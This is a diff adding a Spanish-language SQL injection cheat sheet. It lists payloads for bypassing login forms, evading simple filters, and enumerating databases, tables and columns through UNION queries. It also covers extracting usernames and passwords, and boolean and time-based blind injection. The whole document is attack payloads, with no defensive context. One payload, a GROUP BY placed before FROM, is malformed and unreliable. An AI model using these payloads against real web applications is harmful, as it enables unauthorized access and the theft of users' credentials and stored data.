@@ -1,0 +1,51 @@
+* AUTENTICACIÓN BYPASS SQLi
+
+▶ Saltar login con condición siempre verdadera:
+  ' OR '1'='1' -- 
+  ' OR 1=1 -- 
+  admin' -- 
+  admin' #
+
+▶ Evitar filtros comunes:
+  ' OR 'a'='a' -- 
+  ' OR 1=1 LIMIT 1 OFFSET 0 -- 
+
+* ENUMERACIÓN DE BASES DE DATOS
+
+▶ Listar nombres de bases de datos:
+  ' UNION SELECT 1, schema_name FROM information_schema.schemata -- 
+
+* ENUMERACIÓN DE TABLAS
+
+▶ Listar tablas dentro de una base de datos:
+  ' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='nombre_bd' -- 
+
+* ENUMERACIÓN DE COLUMNAS
+
+▶ Obtener columnas de una tabla específica:
+  ' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='usuarios' -- 
+
+* EXTRACCIÓN DE DATOS
+
+▶ Sacar información directamente de una tabla:
+  ' UNION SELECT usuario, contraseña FROM usuarios -- 
+
+* SQLi CIEGA – BOOLEANA
+
+▶ Respuesta basada en verdadero/falso:
+  ' AND 1=1 --      # TRUE
+  ' AND 1=2 --      # FALSE
+  ' AND SUBSTRING((SELECT user()),1,1)='r' -- 
+
+* SQLi CIEGA – TIME-BASED
+
+▶ Inyección basada en retrasos de tiempo:
+  ' OR IF(1=1, SLEEP(5), 0) -- 
+  ' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(3), 0) -- 
+
+* MANIPULACIÓN DE CONSULTAS
+
+▶ Cambiar orden o estructuras:
+  ' ORDER BY 1 -- 
+  ' UNION SELECT null,null -- 
+  ' GROUP BY concat_ws(0x3a,user,password) FROM users -- 
